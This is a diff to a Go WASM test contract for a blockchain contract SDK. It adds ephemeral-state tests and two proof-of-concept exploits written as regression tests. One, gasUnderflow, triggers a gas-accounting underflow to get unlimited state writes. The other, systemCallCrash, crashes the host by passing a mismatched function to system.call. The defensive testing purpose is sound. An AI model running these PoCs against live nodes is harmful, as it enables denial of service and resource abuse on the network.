@@ -33,6 +33,12 @@ func TestStatePut(arg *string) *string {
 		sdk.Abort("invalid state access")
 	}
 
+	sdk.EphemStateSetObject("tempkey", "tempvalue")
+	tempVal := sdk.EphemStateGetObject("", "tempkey")
+	if *tempVal != "tempvalue" {
+		sdk.Abort("invalid ephem state access")
+	}
+
 	sdk.Log("hello world")
 
 	bytes, _ := tinyjson.Marshal(env)
@@ -43,6 +49,7 @@ func TestStatePut(arg *string) *string {
 
 // - Access Saved State
 // - Delete a saved key
+// - Verify non-existence of ephemeral state
 //
 //go:wasmexport test2
 func TestStateGetModify(arg *string) *string {
@@ -65,11 +72,18 @@ func TestStateGetModify(arg *string) *string {
 		sdk.Abort("invalid state access")
 	}
 
+	tempVal := sdk.EphemStateGetObject("", "tempkey")
+	if *tempVal == "tempvalue" {
+		sdk.Abort("ephem state should be empty at start of new tx")
+	}
+
 	return &ret
 }
 
 // - Draw user balance to contract
 // - Verify pulled balance
+// - Verify ephemeral state
+// - Runs after test1 and createKey
 //
 //go:wasmexport test3
 func TestTokenDraw(arg *string) *string {
@@ -87,6 +101,11 @@ func TestTokenDraw(arg *string) *string {
 	sdk.Log("test3: step 4")
 	balStr := strconv.FormatInt(bal, 10)
 	ret := "bal: " + balStr
+
+	tempVal := sdk.EphemStateGetObject("", "tempkey")
+	if *tempVal != "tempvalue" {
+		sdk.Abort("incorrect ephem state access")
+	}
 
 	return &ret
 }
@@ -161,6 +180,32 @@ func GetString(a *string) *string {
 //go:wasmexport clearString
 func ClearString(a *string) *string {
 	sdk.StateDeleteObject(*a)
+	return nil
+}
+
+//go:wasmexport getEphemStr
+func EphemGetStr(a *string) *string {
+	params := strings.Split((*a), ",")
+	if len(params) < 2 {
+		return sdk.EphemStateGetObject("", params[0])
+	} else {
+		return sdk.EphemStateGetObject(params[0], params[1])
+	}
+}
+
+//go:wasmexport setEphemStr
+func EphemSetStr(a *string) *string {
+	params := strings.Split((*a), ",")
+	if len(params) < 2 {
+		sdk.Abort("invalid payload")
+	}
+	sdk.EphemStateSetObject(params[0], params[1])
+	return a
+}
+
+//go:wasmexport clearEphemStr
+func EphemClearStr(a *string) *string {
+	sdk.EphemStateDeleteObject(*a)
 	return nil
 }
 
@@ -319,6 +364,57 @@ func ContractCall(a *string) *string {
 func InfRecursion(a *string) *string {
 	contractId := sdk.GetEnvKey("contract.id")
 	return sdk.ContractCall(*contractId, "infiniteRecursion", "a", nil)
+}
+
+//go:wasmexport gasUnderflow
+func GasUnderflow(a *string) *string {
+	// Step 1: Small write — should succeed within gas budget
+	sdk.Log("step1: small write")
+	sdk.StateSetObject("poc-small", "ok")
+
+	// Step 2: Large write — 200 bytes key+value to trigger underflow
+	// Gas cost = 200 * 19 * 100,000 = 380,000,000
+	// With rc_limit=1000, budget = 100,000,000 — this exceeds it
+	bigKey := "poc-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+	bigVal := "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+	sdk.Log("step2: large write to trigger underflow")
+	sdk.StateSetObject(bigKey, bigVal)
+
+	// Step 3: If we get here, gas underflow happened — we should be out of gas but aren't
+	sdk.Log("step3: post-underflow — should NOT reach here if gas is enforced")
+	sdk.StateSetObject("poc-proof1", "still-running")
+	sdk.StateSetObject("poc-proof2", "gas-is-infinite")
+	sdk.StateSetObject("poc-proof3", "unlimited-writes")
+
+	// Step 4: Do 20 more writes to prove unlimited execution
+	for i := 0; i < 20; i++ {
+		key := "poc-spam-" + strconv.Itoa(i)
+		sdk.StateSetObject(key, "should-be-blocked")
+	}
+
+	sdk.Log("step4: completed 20+ writes after gas should have been exhausted")
+	ret := "EXPLOIT_SUCCESS"
+	return &ret
+}
+
+// systemCallCrash triggers a panic in the host by calling system.call with a
+// function name whose arity doesn't match the hard-coded type assertion in
+// sdk.go line 209: f.(func(context.Context, any) SdkResult).
+// hive.transfer is func(ctx, any, any, any) SdkResult — 3 value args, not 1.
+//
+//go:wasmexport systemCallCrash
+func SystemCallCrash(a *string) *string {
+	sdk.Log("systemCallCrash: calling system.call with hive.transfer")
+	// The second arg is a JSON object; system.call parses .arg0 out of it.
+	// The target function (hive.transfer) has 3 value params, but system.call
+	// will try to assert it as func(context.Context, any) SdkResult — panic.
+	result := sdk.SystemCall("hive.transfer", `{"arg0":"anything"}`)
+	// If we reach here, the panic was somehow caught or the bug is fixed
+	ret := "NO_CRASH"
+	if result != nil {
+		ret = "NO_CRASH:" + *result
+	}
+	return &ret
 }
 
 //go:wasmexport createKey
